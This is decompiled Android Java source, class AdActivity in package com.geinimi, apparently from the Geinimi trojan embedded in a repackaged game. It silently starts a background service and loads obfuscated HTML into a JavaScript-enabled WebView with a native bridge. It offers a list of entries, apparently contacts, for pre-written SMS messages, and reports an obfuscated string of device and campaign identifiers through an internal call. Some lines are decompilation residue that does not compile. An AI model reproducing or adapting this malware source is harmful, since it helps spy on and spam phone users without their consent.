package com.geinimi;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.app.AlertDialog.Builder;
import android.app.Dialog;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.view.ViewGroup;
import android.webkit.WebView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.LinearLayout.LayoutParams;
import android.widget.ListView;
import android.widget.ProgressBar;
import com.geinimi.ads.d;
import com.geinimi.ads.o;
import com.geinimi.c.c;
import com.geinimi.c.k;
import com.geinimi.c.l;
import com.geinimi.c.m;
import com.geinimi.custom.AdShow;
import com.sumsharp.monster.common.Tool;
import java.io.File;
import java.io.FileInputStream;
import java.util.HashMap;

public class AdActivity extends Activity {
    public static final String STR_PARA_KEY = "ACTIVITY_PARAM_KEY";
    public static final String STR_PARA_SUGGEST_CONTENT_KEY = "ACTIVITY_PARAM_SUGGEST_CONTENT_KEY";
    public static final String STR_PARA_SUGGEST_SMS_KEY = "ACTIVITY_PARAM_SUGGEST_SMS_KEY";
    public static final String STR_PARA_URL_KEY = "ACTIVITY_PARAM_URL_KEY";
    /* access modifiers changed from: private */
    public static boolean f = false;
    /* access modifiers changed from: private */
    public static boolean g = false;
    HashMap a = null;
    ProgressBar b = null;
    ArrayAdapter c = null;
    Button d = null;
    private WebView e = null;
    private LinearLayout h = null;
    private String i = null;
    /* access modifiers changed from: private */
    public String j = null;
    /* access modifiers changed from: private */
    public c[] k = null;
    /* access modifiers changed from: private */
    public boolean[] l = null;

    private void a(C0000r rVar) {
        String a2 = ((d) rVar.f()).a((String) STR_PARA_URL_KEY);
        "Load URL = " + a2;
        this.e = new WebView(this);
        this.a = new HashMap();
        if (this.b == null) {
            this.b = new ProgressBar(this, null, 16842872);
        }
        this.b.setProgress(0);
        this.e.addJavascriptInterface(new a(this), "hrefmap");
        if (a2.startsWith("file:")) {
            File file = new File(a2.substring(6));
            int length = (int) file.length();
            byte[] bArr = new byte[length];
            try {
                FileInputStream fileInputStream = new FileInputStream(file);
                for (int i2 = 0; i2 < length; i2 += fileInputStream.read(bArr, i2, length - i2)) {
                }
                fileInputStream.close();
                byte[] a3 = m.a(bArr);
                this.e.loadDataWithBaseURL("file:/" + file.getParent() + "/", ((a3[0] & 255) == 239 && (a3[1] & 255) == 187 && (a3[2] & 255) == 191) ? new String(a3, 3, a3.length - 3) : new String(a3), "text/html", "utf-8", "");
            } catch (Exception e2) {
                e2.printStackTrace();
                finish();
            }
        } else {
            this.e.loadUrl(a2);
        }
        this.e.clearCache(true);
        this.e.getSettings().setJavaScriptEnabled(true);
        requestWindowFeature(2);
        this.e.setWebChromeClient(new e(this));
        this.e.setWebViewClient(new f(this, rVar));
        this.b.setIndeterminate(false);
        LayoutParams layoutParams = new LayoutParams(-1, -2);
        this.h = new LinearLayout(this);
        this.h.setOrientation(1);
        this.h.addView(this.b, layoutParams);
        this.h.addView(this.e, new LayoutParams(-1, -1, 1.0f));
        setContentView(this.h, new ViewGroup.LayoutParams(-1, -1));
    }

    static /* synthetic */ void d(AdActivity adActivity) {
        adActivity.k = k.j();
        if (adActivity.k.length == 0) {
            adActivity.finish();
        }
        LinearLayout linearLayout = new LinearLayout(adActivity);
        ListView listView = new ListView(adActivity);
        linearLayout.addView(listView, new LayoutParams(-1, -1, 1.0f));
        linearLayout.setOrientation(1);
        LinearLayout linearLayout2 = new LinearLayout(adActivity);
        linearLayout2.setOrientation(0);
        linearLayout2.setGravity(1);
        Button button = new Button(adActivity);
        button.setOnClickListener(new h(adActivity));
        button.setText("确定");
        linearLayout2.addView(button);
        adActivity.d = new Button(adActivity);
        adActivity.d.setOnClickListener(new i(adActivity));
        adActivity.d.setText("全选");
        linearLayout2.addView(adActivity.d);
        Button button2 = new Button(adActivity);
        button2.setOnClickListener(new j(adActivity));
        button2.setText("取消");
        linearLayout2.addView(button2);
        linearLayout.addView(linearLayout2);
        adActivity.setContentView(linearLayout);
        String[] strArr = new String[adActivity.k.length];
        adActivity.l = new boolean[adActivity.k.length];
        for (int i2 = 0; i2 < adActivity.k.length; i2++) {
            String str = adActivity.k[i2].b;
            int indexOf = str.indexOf(59);
            if (indexOf > 0) {
                str = str.substring(0, indexOf);
            }
            strArr[i2] = adActivity.k[i2].a + "(" + str + ")";
            adActivity.l[i2] = false;
        }
        adActivity.c = new k(adActivity, adActivity, 17367045, strArr);
        listView.setAdapter(adActivity.c);
        listView.setOnItemClickListener(new l(adActivity));
    }

    public static boolean isRunningServices(Context context) {
        for (RunningServiceInfo next : ((ActivityManager) context.getSystemService("activity")).getRunningServices(100)) {
            Object obj = null;
            try {
                obj = Class.forName(next.service.getClassName()).newInstance();
            } catch (Exception e2) {
            }
            if (!AdService.f().equals(next.service.getClassName())) {
                if (obj instanceof AdService) {
                }
            }
            return !next.process.equals(context.getPackageName());
        }
        return false;
    }

    public static void setDebugMode() {
        AdService.a();
    }

    public static void startAdService(Context context) {
        if (!isRunningServices(context)) {
            Class<?> cls = null;
            try {
                cls = Class.forName(AdService.f());
            } catch (Exception e2) {
            }
            if (cls != null) {
                Intent intent = new Intent(context, cls);
                intent.addFlags(Tool.FILL_VERYDARK);
                context.startService(intent);
            }
        }
    }

    public void onCreate(Bundle bundle) {
        Class<?> cls;
        Class<?> cls2;
        setTitle("");
        super.onCreate(bundle);
        try {
            Bundle extras = getIntent().getExtras();
            "OnCreate......bundle =" + extras;
            if (extras == null) {
                "bundle = " + extras;
                if (!isRunningServices(this)) {
                    try {
                        cls2 = Class.forName(AdService.f());
                    } catch (Exception e2) {
                        cls2 = null;
                    }
                    if (cls2 != null) {
                        startService(new Intent(this, cls2));
                    }
                }
                try {
                    cls = Class.forName(AdService.a);
                } catch (Exception e3) {
                    cls = null;
                }
                if (cls != null) {
                    startActivity(new Intent(this, cls));
                }
                AdShow.show();
                finish();
            } else if (extras.getParcelable(STR_PARA_KEY) != null) {
                AdPushable adPushable = (AdPushable) extras.getParcelable(STR_PARA_KEY);
                if (!adPushable.a((Context) this)) {
                    C0000r rVar = (C0000r) adPushable;
                    if (rVar.f() instanceof d) {
                        setTitle("加载中...");
                        a(rVar);
                    } else if (rVar.f() instanceof o) {
                        this.i = rVar.f().a((String) STR_PARA_SUGGEST_CONTENT_KEY);
                        this.j = rVar.f().a((String) STR_PARA_SUGGEST_SMS_KEY);
                        onCreateDialog(1).show();
                    }
                } else {
                    finish();
                }
                l.a(adPushable.c(), m.a(42) + k.f + m.a(43) + k.s + m.a(44) + adPushable.e() + m.a(45) + k.b() + m.a(46) + k.c() + m.a(47) + k.d() + m.a(67) + k.e() + m.a(68) + k.f() + m.a(69) + k.g() + m.a(48) + adPushable.d());
            }
        } catch (Exception e4) {
        }
    }

    public Dialog onCreateDialog(int i2) {
        return i2 == 1 ? new Builder(this).setTitle(this.i).setPositiveButton("好", new d(this)).setNegativeButton("不", new c(this)).setOnCancelListener(new b(this)).create() : super.onCreateDialog(i2);
    }
}
